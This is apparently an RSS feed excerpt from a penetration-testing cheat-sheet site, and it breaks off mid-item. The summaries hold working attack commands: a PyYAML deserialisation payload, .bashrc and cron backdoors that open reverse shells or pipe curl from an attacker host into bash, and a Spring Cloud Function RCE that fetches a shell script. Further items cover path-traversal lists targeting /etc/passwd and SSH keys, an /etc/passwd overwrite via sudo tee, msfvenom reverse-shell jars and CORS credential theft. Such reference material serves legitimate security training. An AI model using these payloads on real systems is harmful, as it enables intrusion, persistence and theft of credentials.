      <description>Investigation link import yaml filename = &amp;#34;example.yml&amp;#34; yaml.load() Payloads link import yaml from yaml import Loader, UnsafeLoader data = b&amp;#39;!!python/object/new:os.system [&amp;#34;cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u&amp;#43;sx /tmp/bash&amp;#34;]&amp;#39; yaml.load(data) yaml.load(data, Loader=Loader) yaml.load(data, Loader=UnsafeLoader) yaml.load_all(data) yaml.load_all(data, Loader=Loader) yaml.load_all(data, Loader=UnsafeLoader) yaml.unsafe_load(data) Now execute the bash in privilege mode.&#xA;/tmp/bash -p Reverse Shell linkStart a listener in local machine.&#xA;nc -lvnp 1234 Then execute Python script that contains the following YAML code as root.</description>
    </item>
    <item>
      <title>Windows XML EventLog (EVTX)</title>
      <link>https://documentnation.github.io/docs/hdks/windows/forensics/windows-xml-eventlog/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/windows-xml-eventlog/</guid>
      <description>Read EVTX in Linux linkWe can parse .evtx file in Linux using evtx_dump.&#xA;wget https://github.com/omerbenamram/evtx/releases/download/v0.8.1/evtx_dump-v0.8.1-x86_64-unknown-linux-gnu -O evtx_dump chmod &amp;#43;x evtx_dump ./evtx_dump example.evtx &amp;gt; parsed.txt Now we can find sensitive information from the parsed text.&#xA;grep -i TargetUserName parsed.txt grep -i TargetDomainName parsed.txt Search Suspicious Activity in EVTX linkChainsaw is a command-line tool to rapidly search and hunt through Windows Forensics Artifacts.&#xA;git clone https://github.com/WithSecureLabs/chainsaw.git cd chainsaw cargo build --release ./chainsaw hunt evtx_files/ -s sigma/rules --mapping mapping/sigma-event-logs-all.</description>
    </item>
    <item>
      <title>Django Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/</guid>
      <description>SSTI (Server-Side Template Injection) link # XSS {{ `&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;` }} # Debug information {% debug %} Bypass ALLOWED_HOSTS linkIf we get the error “Invalid HTTP_HOST header: &amp;lsquo;x.x.x.x:8000&amp;rsquo;. You may need to add &amp;lsquo;x.x.x.x&amp;rsquo; to ALLOWED_HOSTS&amp;quot; when accessing the website written in Django, you need to intercept the value of the Host in the HTTP request header.&#xA;Then you should be able to access the website.&#xA;Host: 0.0.0.0:8000 # or Host: 127.</description>
    </item>
    <item>
      <title>Linux Backdoors</title>
      <link>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/</guid>
      <description>.bashrc linkAdd this line to /root/.bashrc or /home/&amp;lt;user&amp;gt;/.bashrc to gain access to target machine by reverse shell when the victim user logged in.&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 Of course we need to always open netcat listener to be able to fetch incoming connection from the target.&#xA;nc -lvnp 4444 Cron linkAdd this line to the cron file like /etc/crontab in the target machine.&#xA;* * * * * root curl http://&amp;lt;local-ip&amp;gt;:&amp;lt;local-port&amp;gt;/shell | bash Create the “shell” file in local machine.</description>
    </item>
    <item>
      <title>Bash eq Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</link>
      <pubDate>Thu, 16 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</guid>
      <description>Investigation linkPlease see this post for details.&#xA;sudo -l (root) /bin/bash /opt/example.sh If we can execute above command as root, and the /opt/example.sh contains the numeric comparison such as [[ $var -eq 42 ]], we can execute arbitrary command.&#xA;#!/bin/bash read -rp &amp;#34;Enter guess: &amp;#34; num if [[ $num -eq 42 ]] then echo &amp;#34;Correct&amp;#34; else echo &amp;#34;Wrong&amp;#34; fi To execute arbitrary command, answer this question as below.&#xA;sudo /bin/bash /opt/example.</description>
    </item>
    <item>
      <title>Ansible Playbook Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</link>
      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</guid>
      <description>PrivEsc with Tasks linkFirst off, check the content of playbook in /opt/ansible/playbooks.&#xA;For instance, a file named “httpd.yaml”.&#xA;- name: Install and configure Apache ... roles: - role: geerlingguy.apache tasks: - name: configure firewall firewalld: ... Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks.&#xA;And add the exploitable file in this.&#xA;For example, a file named “shell.yml”.&#xA;- hosts: localhost tasks: - name: RShell command: sudo bash /tmp/root.sh Create a exploit for reverse shell.</description>
    </item>
    <item>
      <title>Spring Cloud Function RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/</link>
      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/</guid>
      <description>Exploitation linkReverse Shell linkFirst create a reverse shell script in local machine.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 Then start a web server for uploading it.&#xA;python3 -m http.server Now remote code execution with target website as below.&#xA;curl -X POST https://example.com:8080/functionRouter -H &amp;#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&amp;#34;wget http://10.0.0.1/shell -O /tmp/shell&amp;#34;)&amp;#39; --data-raw &amp;#39;data&amp;#39; -v Our reverse shell script is uploaded.&#xA;Start a listener in local machine.&#xA;nc -lvnp 4444 Remote code execution again to reverse shell.</description>
    </item>
    <item>
      <title>Chrome Remote Debugger Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</link>
      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</guid>
      <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
    </item>
    <item>
      <title>Directory (Path) Traversal</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/</link>
      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/</guid>
      <description>/?file=index.php /?file=index.html /?file=/etc/passwd /?file=../../../etc/passwd /?file=../../../../etc/passwd /?file=../../../../../etc/passwd /?file=..//..//..//..//etc/passwd /?file=....//....//....//etc/passwd /?file=....//....//....//....//etc/passwd # URL encode /?file=..%252f..%252f..%252fetc/passwd /?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd # URL double encode /?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd /?file=/var/www/images/../../../etc/passwd /?file=/etc/passwd%00.png /?file=../../../etc/passwd%00.png /?file=....//....//....//etc/passwd%00.png /?file=..%252f..%252f..%252fetc/passwd%00.png /?file=/var/www/images/../../../etc/passwd%00.png # Hostfile /?file=/etc/hosts # SSH keys /?file=../../../../../home/&amp;lt;username&amp;gt;/.ssh/authorized_keys /?file=../../../../../home/&amp;lt;username&amp;gt;/.ssh/id_rsa # Web root in the developer&amp;#39;s home /?file=../../../../home/&amp;lt;username&amp;gt;/app/app.py # PHP web application /index.php/../ /index.php/..;/ /index.php/%2e%2e;/ # Windows /?file=..\..\..\windows\win.ini Apache 2.4.49 (CVE-2021-41773) link # without CGI enabled curl -v &amp;#39;https://example.com/cgi-bin/../../../../../../../../../../etc/passwd&amp;#39; curl -v &amp;#39;https://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd&amp;#39; curl -v &amp;#39;https://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&amp;#39; # with CGI enabled curl -v &amp;#39;http://example.</description>
    </item>
    <item>
      <title>Microsoft Outlook Message (.msg)</title>
      <link>https://documentnation.github.io/docs/hdks/windows/service/microsoft-outlook-message/</link>
      <pubDate>Fri, 10 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/service/microsoft-outlook-message/</guid>
      <description>Decrypt &amp;amp; Open in Linux link sudo apt-get install libemail-outlook-message-perl libemail-sender-perl msgcovert example.msg open example.eml Extract Attached Files linkIf the message is attached some file e.g. .zip, we can extract the file.&#xA;1. In CyberChef, paste the text contains Base64 encoded. linkFor example,&#xA;Content-ID: Content-Type: application/octet-stream; name=example.zip Content-Disposition: attachment; filename=example.zip Content-Transfer-Encoding: base64 UEsDBBQAAAAIAJBsAVWzNSwXM3oTAAAQ8QANAAAAc2VjdXJpdHkuZXZ0eOxdCXxVxdU/b8nLRhZk R5aAoqINJISwChISAlSQCEHFUjCQxABJwCTsLnHBtSpabW2t1rpVu1g/97pVa22prRqXKrW0ta1t ... 6Vf33X5WvnNm5rx7373vvnffct97I== 2. Attach “Base64” and “Extract Files” operations. linkAfter baking, we should get the attached file and download it.</description>
    </item>
    <item>
      <title>OpenSSL Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</guid>
      <description>Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/&#xA;1. Get Capabilities linkChack capabilities in the target machine.&#xA;# -r: recursive getcap -r / 2&amp;gt;/dev/null If you see the openssl has the capability set as below, you can successfully exploit it.&#xA;/usr/bin/openssl = cap_setuid&amp;#43;ep 2. Create the Exploit in C linkIn local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.&#xA;If you don&amp;rsquo;t have it yet, install it.</description>
    </item>
    <item>
      <title>PHP Object Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/</guid>
      <description>Investigation linkBelow is an example of an index.php in PHP web application.&#xA;&amp;lt;?php class Example { public $file = &amp;#39;example.txt&amp;#39;; public $msg = &amp;#39;Hello World&amp;#39;; public function SomeFunc() { // Some code ... } public function __destruct() { file_put_contents(__DIR__ . &amp;#39;/&amp;#39; . $this-&amp;gt;file,$this-&amp;gt;msg,FILE_APPEND); } } $data = unserialize($_GET[&amp;#39;data&amp;#39;]); // Some code ... ?&amp;gt; This code adds a text file named example.txt, that contains &amp;ldquo;Hello World&amp;rdquo; strings, into the web root directory.</description>
    </item>
    <item>
      <title>PHP Srand Time Abusing</title>
      <link>https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/</guid>
      <description>Investigation link function generate_random_number() { srand(time()); // Some code for generating random number... return random_numbers; } For example, assume website uses the above function that generates random numbers or strings to be used for authentications such as activation code, multi-factor security code.&#xA;In such cases, we can replace the “time()” function with the “strtotime()” to make the result to be non-random.&#xA;Exploitation link1. Send Request linkFirst off, send the request for executing the desired function e.</description>
    </item>
    <item>
      <title>JSON.NET Deserialization</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/</link>
      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/</guid>
      <description>Investigation linkWe can decompile .dll files using ILSpy in Windows. If you like to use ILSpy in Linux, use AvaloniaILSpy.&#xA;json = JsonConvert.DeserializeObject&amp;lt;Example&amp;gt;(json); If the application uses “JsonConvert.DeserializeObject” function, we can abuse JSON object and execute arbitrary code or read local files.&#xA;Exploitation linkWe can give the Json value to the “JsonConvert.DeserializeObject(json)” with a reserved key ($type).&#xA;The format is as follow. The value of $type is a string that contains the assembly-qualified name of the .</description>
    </item>
    <item>
      <title>WebSocket Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</link>
      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</guid>
      <description>Connect with CLI linkwebsocat is a command-line client for WebSockets, like netcat for&#xA;websocat ws://&amp;lt;ip&amp;gt;/ Connect with Python Script link import websocket,json ws = websocket.WebSocket() ws.connect(&amp;#34;ws://10.0.0.1/&amp;#34;) d = {&amp;#34;message&amp;#34;: &amp;#34;hello&amp;#34;} data = str(json.dumps(d)) ws.send(data) result = ws.recv() print(json.loads(result)) As above, we can manipulate the data to send. For example,&#xA;{&amp;#34;message&amp;#34;: &amp;#34;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;} If the website reflects the result of the above interactions, we can affect the website.&#xA;Blind SQL Injection linkFirst, create a Python script to establish a middleware server to forward sqlmap payloads to the target WebSocket server.</description>
    </item>
    <item>
      <title>Apache Conf Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.&#xA;Exploitation link1. Update Apache.Conf linkFirst modify “apache.conf” file to change the web user with new one.&#xA;# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.</description>
    </item>
    <item>
      <title>HTTP Rate Limit Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/</guid>
      <description>Bypass linkWe may be able to bypass the rate limiting by adding one of the following headers and change the IP per request.&#xA;Sometimes, we need to add multiple headers.&#xA;X-Forwarded: &amp;lt;IP&amp;gt; X-Forwarded-For: &amp;lt;IP&amp;gt; X-Forwarded-Host: &amp;lt;IP&amp;gt; X-Client-IP: &amp;lt;IP&amp;gt; X-Remote-IP: &amp;lt;IP&amp;gt; X-Remote-Addr: &amp;lt;IP&amp;gt; X-Host: &amp;lt;IP&amp;gt; X-Originating-IP: &amp;lt;IP&amp;gt; </description>
    </item>
    <item>
      <title>Mara CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/</guid>
      <description>Default Credentials link admin:changeme Remote Code Execution (RCE) v7.5 linkReference: https://www.exploit-db.com/exploits/48780&#xA;Automation link msfconsole msf&amp;gt; use exploit/multi/http/maracms_upload_exec msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set srvhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set srvport &amp;lt;local-port&amp;gt; msf&amp;gt; set targeturi /path/to/maracms/ msf&amp;gt; set targeturipath /path/to/maracms/ </description>
    </item>
    <item>
      <title>PowerShell</title>
      <link>https://documentnation.github.io/docs/hdks/windows/powershell/powershell/</link>
      <pubDate>Sun, 05 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/powershell/powershell/</guid>
      <description>Start PowerShell linkOn Linux link pwsh # Execute PS commands without entering shell. pwsh -Command &amp;lt;cmdlet&amp;gt; On Windows link powershell # Bypass ExecutionPolicy powershell -ep bypass # check for the result PS&amp;gt; Get-ExecutionPolicy Commands linkOS Information link $PSVersionInfo Change Directory link&amp;lsquo;cd&amp;rsquo; in Linux.&#xA;Set-Location -Path c:\Users\Administrator\Desktop List Files link&amp;rsquo;ls&amp;rsquo; in Linux.&#xA;Get-ChildItem -File -Hidden Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Get-ChildItem -Directory -Hidden Get-ChildItem -Directory -Hidden -Recurse -Filter &amp;#39;*secret*&amp;#39; -ErrorAction SilentlyContinue Get-ChildItem -Path .</description>
    </item>
    <item>
      <title>Codiad Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</guid>
      <description>Default Credentials link # Docker image - https://hub.docker.com/r/bitnami/codiad user:bitnami Enumeration link # Get current directory in the system /components/project/controller.php?action=get_current Remote Code Execution (RCE) v2.8.4 link wget https://www.exploit-db.com/exploits/49705 -O exploit.py # Linux python3 exploit.py https://example.com/ admin admin &amp;lt;local-ip&amp;gt; 4444 linux # Windows python3 exploit.py https://example.com/ admin admin &amp;lt;local-ip&amp;gt; 4444 windows </description>
    </item>
    <item>
      <title>Sudo Tee Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</guid>
      <description>Investigation link (root) NOPASSWD: /usr/bin/tee If we can execute tee command as root, we can escalate to privilege.&#xA;Exploitation link1. Create a New Password for New User linkAssume the new username is &amp;ldquo;tester&amp;rdquo;.&#xA;# -1: MD5 algorithm # -salt: Use privided salt -&amp;gt; The new username here openssl passwd -1 -salt &amp;#34;tester&amp;#34; &amp;#34;password123&amp;#34; # Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/ Copy the output password.&#xA;2. Write New Line with Tee linkPaste the password in printf and overwrite /etc/passwd using tee command.</description>
    </item>
    <item>
      <title>Apache ActiveMQ Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</link>
      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</guid>
      <description>Default Credentials link admin:admin Interaction with MQTT linkIf the MQTT server is runnong on the target system, we can subscribe/publish to a topic in ActiveMQ using MQTT client.&#xA;Subscribe to a Topic link # -h: Host # -t: Topic name # -V: MQTT protocol version (5, 31, 311) mosquitto_sub -h example.com -u admin -P admin -t &amp;#39;example/topic&amp;#39; -V 31 Web Shell by File Upload JSP linkActiveMQ is vulnerable to web shell via file upload an arbitrary JSP file.</description>
    </item>
    <item>
      <title>FUEL CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/</link>
      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/</guid>
      <description>Default Credential link admin:admin </description>
    </item>
    <item>
      <title>Subrion CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/</link>
      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/</guid>
      <description>File Upload to Reverse Shell (Credential Required) link1. Download Reverse Shell Payload linkGet the PHP payload from php-reverse-shell. And change the file extension to &amp;rsquo;.phar&amp;rsquo;.&#xA;Then start a listener.&#xA;nc -lvnp 4444 2. Upload the Payload in Subrion Panel link Login&#xA;Move to Content -&amp;gt; Uploads in Panel&#xA;Upload reverse-shell.phar&#xA;Access to /subrion/upload/reverse-shell.phar&#xA;Now you get a shell.</description>
    </item>
    <item>
      <title>ClipBucket Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/</link>
      <pubDate>Sun, 19 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/</guid>
      <description>Arbitrary File Upload &amp;lt; v4.0.0 linkClipBucket versions before 4.0.0 is vulnerable to file upload in ‘uploader’ actions. We can upload arbitrary files so we can execute reverse shell.&#xA;1. Prepare Payload linkCreate a PHP script to reverse shell in local machine.&#xA;cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php Update $ip and $port with your local ip address and port.&#xA;2. Upload the Payload linkNext upload the above PHP script to the target website.&#xA;curl -F &amp;#34;file=@shell.</description>
    </item>
    <item>
      <title>Insecure Deserialization</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/</guid>
      <description>PHP Gadget Chains linkPHPGGC linkPHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.&#xA;phpggc -l Ysoserial linkYsoserial is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</description>
    </item>
    <item>
      <title>Sudo OpenVPN Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</guid>
      <description>Investigation link (root) /usr/sbin/openvpn /opt/example.ovpn If we can execute openvpn command as root and we have a permission of editing the .ovpn file, we can escalate to privilege.&#xA;Exploitation link1. Create a Payload linkFirst create a shell script to reverse shell. For example, create /tmp/shell.sh.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1 Then change the file permission so that root can execute this script.</description>
    </item>
    <item>
      <title>Update-Motd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/update-motd.d/ If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.&#xA;Exploitation linkRun the following code to copy bash binary and give suid to this file.&#xA;Replace &amp;lt;username&amp;gt; with your current user name.&#xA;echo &amp;#34;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash &amp;amp;&amp;amp; chmod u&amp;#43;s /home/&amp;lt;username&amp;gt;/bash&amp;#34; &amp;gt;&amp;gt; /etc/update-motd.d/00-header After that, log out and log in again with SSH. The above script should be executed.</description>
    </item>
    <item>
      <title>Sudo Umount Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</link>
      <pubDate>Wed, 15 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) NOPASSWD: /bin/umount If we can execute umount command as root, we can escalate to privilege.&#xA;Exploitation linkIn target machine, check what directory is mounted.&#xA;cat /etc/fstab showmount -e localhost Assume the /opt/example folder is mounted.&#xA;If we unmount this folder, original files, that existed before the directory is mounted, may appear.&#xA;sudo /bin/umount /opt/example ls -al /opt/example </description>
    </item>
    <item>
      <title>Apache Tomcat Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/</guid>
      <description>Directories linkBelow are common directories for Apache Tomcat.&#xA;/examples /examples/jsp/cal/login.html /examples/jsp/error/error.html /examples/jsp/snp/snoop.jsp /examples/servlet/HelloWorldEXample /examples/servlet/JndiServlet /examples/servlet/RequestHeaderExample /examples/servlet/RequestInfoExample /examples/servlet/RequestParamExample /host-manager /manager /manager/jmxproxy/?qry=STUFF /manager/status /manager/status/all # We can execute commands in /manager/text/ directory /manager/text/{command}?{parameters} /manager/text/deploy?path=/foo /manager/text/list /manager/text/resources /manager/text/serverinfo /manager/text/vminfo Directory Discovery linkTo enumerate directories automatically, use fuzzing tools.&#xA;ffuf -u https://example.com/FUZZ -w directories.txt ffuf -u https://example.com/host-manager/FUZZ -w ffuf -u https://example.com/manager/FUZZ -w directories.txt Credentials linkBelow are common credentials for the manager app in Tomcat.</description>
    </item>
    <item>
      <title>Log4j Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</guid>
      <description>msfconsole msf&amp;gt; use exploit/multi/http/log4shell_header_injection msf&amp;gt; set HTTP_HEADER ACCEPT msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set SRVHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set SRVPORT 1389 # e.g. Nagios msf&amp;gt; set TARGETURI /~logs msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Exploit Apache Solr (JNDI) linkYou need to prepare your four local terminals.&#xA;1. Start LDAP Server on Your Local Terminal 1 link Install Maven&#xA;sudo apt install maven Get the Payload&#xA;Download the repository.&#xA;git clone https://github.</description>
    </item>
    <item>
      <title>Sudo Java Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) /usr/bin/java -jar *.jar If we can execute java command with arbitrary .jar file as root, we can escalate to privileges.&#xA;Exploitation link1. Create a JAR File linkFirst, create a custom jar file in local machine.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;local-ip&amp;gt; LPORT=4444 -f jar -o shell.jar Then transfer the file to remote machine.&#xA;2. Reverse Shell linkIn local machine, start a listener.</description>
    </item>
    <item>
      <title>Sudo Service Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</link>
      <pubDate>Sat, 11 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL : ALL) /usr/sbin/service vsftpd restart If we can execute service command as root, we may be able to escalate to root privilege.&#xA;Exploitation link1. Find the Location of the Config File linkAssume we can operate the vsftpd service as root. Firse off, find the service config file for vsftpd.&#xA;find / -name &amp;#34;*vsftpd*&amp;#34; For instance, we&amp;rsquo;ll find the location as below.&#xA;/lib/systemd/system/vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service When getting the locations, the next thing to do is to check the permission.</description>
    </item>
    <item>
      <title>CORS (Cross-Origin Resource Sharing) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</link>
      <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</guid>
      <description>Origin Reflection link1. Change Origin Value of Request Header link Origin: https://attacker.com Origin: https://vulnerable.com.attacker.com 2. Check if the Response Allowing Cross-Origin linkIt&amp;rsquo;s reflected the previous reqeust in the response header, you can exploit it.&#xA;Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Origin: https://vulnerable.com.attacker.com Access-Control-Allow-Credentials: true 3. Exploit with Your Malicious Web Page linkFor example, it&amp;rsquo;s hosted as &amp;ldquo;https://attacker.com/exploit&#34; or &amp;ldquo;https://vulnerable.com.attacker.com/exploit&#34;.&#xA;Add the JavaScript code in the web page.&#xA;It shows the users&amp;rsquo; sensitive information of the target website in your server&amp;rsquo;s log.</description>
    </item>
    <item>
      <title>Windows Disk Management</title>
      <link>https://documentnation.github.io/docs/hdks/windows/forensics/windows-disk-management/</link>
      <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
